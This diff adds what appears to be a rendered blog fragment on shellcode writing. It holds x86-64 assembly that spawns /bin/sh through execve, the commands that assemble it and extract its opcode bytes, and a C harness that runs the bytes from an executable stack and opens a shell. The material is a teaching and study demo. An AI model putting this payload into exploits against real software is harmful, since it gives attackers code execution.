@@ -1,0 +1,32 @@
+I"S<hr />
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">➜</span>  <span class="o">~</span>  <span class="n">cat</span> <span class="n">shellcode</span><span class="p">.</span><span class="n">asm</span>
+<span class="kr">section</span> <span class="p">.</span><span class="n">text</span>
+	<span class="kr">global</span> <span class="n">_start</span>
+<span class="n">_start</span><span class="o">:</span>
+	<span class="k">jmp</span> <span class="n">shell</span>
+<span class="n">here</span><span class="o">:</span>
+	<span class="k">xor</span> <span class="n">rax</span><span class="p">,</span><span class="n">rax</span>
+	<span class="k">pop</span> <span class="n">rdi</span>
+	<span class="k">xor</span> <span class="n">rsi</span><span class="p">,</span><span class="n">rsi</span>
+	<span class="k">xor</span> <span class="n">rdx</span><span class="p">,</span><span class="n">rdx</span>
+	<span class="k">add</span> <span class="n">rax</span><span class="p">,</span><span class="mi">59</span>
+	<span class="k">syscall</span>
+<span class="n">shell</span><span class="o">:</span>
+	<span class="k">call</span> <span class="n">here</span>
+<span class="n">bash</span> <span class="kt">db</span> <span class="s">"/bin//sh"</span>
+<span class="err">➜</span>  <span class="o">~</span>  <span class="n">nasm</span> <span class="o">-</span><span class="n">f</span> <span class="n">elf64</span> <span class="n">shellcode</span><span class="p">.</span><span class="n">asm</span> <span class="o">-</span><span class="n">o</span> <span class="n">shellcode</span><span class="p">.</span><span class="n">o</span>
+<span class="err">➜</span>  <span class="o">~</span>  <span class="n">ld</span> <span class="n">shellcode</span><span class="p">.</span><span class="n">o</span> <span class="o">-</span><span class="n">o</span> <span class="n">shellcode</span>
+<span class="err">➜</span>  <span class="o">~</span>  <span class="n">file</span> <span class="n">shellcode</span>
+<span class="n">shellcode</span><span class="o">:</span> <span class="n">ELF</span> <span class="mi">64</span><span class="o">-</span><span class="n">bit</span> <span class="n">LSB</span> <span class="n">executable</span><span class="p">,</span> <span class="n">x86</span><span class="o">-</span><span class="mi">64</span><span class="p">,</span> <span class="n">version</span> <span class="mi">1</span> <span class="p">(</span><span class="n">SYSV</span><span class="p">),</span> <span class="n">statically</span> <span class="n">linked</span><span class="p">,</span> <span class="k">not</span> <span class="n">stripped</span>
+<span class="err">➜</span>  <span class="o">~</span>  <span class="n">for</span> <span class="n">i</span> <span class="k">in</span> <span class="err">$</span><span class="p">(</span><span class="n">objdump</span> <span class="o">-</span><span class="n">d</span> <span class="n">shellcode</span> <span class="o">-</span><span class="n">M</span> <span class="n">intel</span> <span class="o">|</span> <span class="n">grep</span> <span class="s">"^ "</span> <span class="o">|</span> <span class="n">cut</span> <span class="o">-</span><span class="n">f2</span><span class="p">)</span><span class="c">; do echo -n '\x'$i; done;echo</span>
+<span class="err">\</span><span class="n">xeb</span><span class="err">\</span><span class="n">x10</span><span class="err">\</span><span class="n">x48</span><span class="err">\</span><span class="n">x31</span><span class="err">\</span><span class="n">xc0</span><span class="err">\</span><span class="n">x5f</span><span class="err">\</span><span class="n">x48</span><span class="err">\</span><span class="n">x31</span><span class="err">\</span><span class="n">xf6</span><span class="err">\</span><span class="n">x48</span><span class="err">\</span><span class="n">x31</span><span class="err">\</span><span class="n">xd2</span><span class="err">\</span><span class="n">x48</span><span class="err">\</span><span class="n">x83</span><span class="err">\</span><span class="n">xc0</span><span class="err">\</span><span class="n">x3b</span><span class="err">\</span><span class="n">x0f</span><span class="err">\</span><span class="n">x05</span><span class="err">\</span><span class="n">xe8</span><span class="err">\</span><span class="n">xeb</span><span class="err">\</span><span class="n">xff</span><span class="err">\</span><span class="n">xff</span><span class="err">\</span><span class="n">xff</span><span class="err">\</span><span class="n">x2f</span><span class="err">\</span><span class="n">x62</span><span class="err">\</span><span class="n">x69</span><span class="err">\</span><span class="n">x6e</span><span class="err">\</span><span class="n">x2f</span><span class="err">\</span><span class="n">x2f</span><span class="err">\</span><span class="n">x73</span><span class="err">\</span><span class="n">x68</span>
+</code></pre></div></div>
+<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
+</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"</span><span class="se">\xeb\x10\x48\x31\xc0\x5f\x48\x31\xf6\x48\x31\xd2\x48\x83\xc0\x3b\x0f\x05\xe8\xeb\xff\xff\xff\x2f\x62\x69\x6e\x2f\x2f\x73\x68</span><span class="s">"</span><span class="p">;</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span> <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">ret</span><span class="p">)()</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">(</span><span class="o">*</span><span class="p">)())</span><span class="n">shellcode</span><span class="p">;</span> <span class="n">ret</span><span class="p">();}</span>
+</code></pre></div></div>
+<div class="language-zsh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  ~  gcc shellcode.c <span class="nt">-z</span> execstack <span class="nt">-o</span> c_shellcode
+➜  ~  ./shellcode
+<span class="c"># </span>
+</code></pre></div></div>
+:ET
